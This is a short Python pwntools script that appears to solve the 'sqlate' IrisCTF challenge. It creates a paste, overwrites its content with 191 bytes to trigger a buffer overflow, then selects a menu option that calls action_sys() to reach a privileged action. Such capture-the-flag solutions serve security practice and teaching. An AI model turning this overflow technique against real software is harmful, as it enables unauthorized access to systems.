from pwn import *

context.log_level = 'debug'

p = process('./vuln')
# p = remote('sqlate.chal.irisc.tf', 10000)

#1 Create new Paste
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Title: ', b'iris')
p.sendlineafter(b'Language: ', b'Kor')
p.sendlineafter(b'Content: ', b'A')

#2 Update a Paste, Content -> HEX
payload = b'A' * 191
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'content: ', payload)
p.sendlineafter(b'Title: ', b'iris')

#3 List all Pastes for BOF
p.sendlineafter(b'> ', b'4')

#4 Run action_sys()
p.sendlineafter(b'> ', b'7')

print(p.recvline())
